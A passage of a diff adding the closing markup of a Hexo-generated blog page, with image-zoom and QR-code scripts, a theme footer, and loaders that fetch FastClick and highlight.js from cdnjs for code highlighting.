+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+  <script>
+    var qr = new QRious({
+      element: document.getElementById('share-qrcode'),
+      value: document.location.href
+    });
+  </script>
+
+
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer">
+  <p class="copyright">
+    &copy; 2021 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a target="_blank" rel="noopener" href="https://github.com/yanm1ng">yanm1ng</a>
+  </p>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      hljs.configure({useBR: true});
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
